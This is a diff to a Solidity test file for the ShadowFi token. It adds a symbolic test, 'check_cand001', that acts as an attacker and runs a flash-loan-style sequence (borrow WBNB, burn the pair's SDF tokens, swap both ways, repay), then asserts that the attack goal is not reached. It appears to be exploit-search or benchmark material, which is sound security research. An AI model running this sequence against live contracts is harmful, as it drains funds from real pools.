@@ -1,9 +1,9 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-import "./AttackContract.sol";
-import "./ShadowFi.sol";
 import "@utils/QueryBlockchain.sol";
 import "forge-std/Test.sol";
+import {AttackContract} from "./AttackContract.sol";
+import {ShadowFi} from "./ShadowFi.sol";
 import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
 import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
 import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
@@ -208,6 +208,27 @@ contract ShadowFiTest is Test, BlockLoader {
     }
 
     function check_cand001(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.assume(amt6 >= amt0);
+        borrow_wbnb_owner(amt0);
+        burn_sdf_pair(amt1);
+        swap_pair_attacker_wbnb_sdf(amt2, amt3);
+        swap_pair_attacker_sdf_wbnb(amt4, amt5);
+        payback_wbnb_owner(amt6);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand002(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
